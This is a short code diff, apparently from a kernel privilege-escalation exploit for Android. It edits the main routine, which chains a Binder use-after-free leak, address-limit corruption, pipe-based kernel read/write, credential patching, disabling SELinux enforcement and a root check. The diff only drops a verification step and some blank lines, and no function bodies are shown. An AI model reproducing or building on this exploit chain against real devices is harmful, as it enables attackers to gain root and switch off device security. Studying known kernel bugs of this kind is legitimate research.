@@ -23,11 +23,7 @@ int main() {
 
   binder_uaf_leak_task_struct(ctx, &leak_task_struct, &addrs);
   corrupt_address_limit(ctx, &leak_task_struct);
-
   init_kernel_read_write_pipe(pipefd);
-
-  verify_arbitrary_read_write(pipefd, leak_task_struct, addrs.pid);
-
   patch_cred(pipefd, leak_task_struct, addrs.cred);
   disable_selinux_enforcing(pipefd, addrs.nsproxy);
   verify_root();
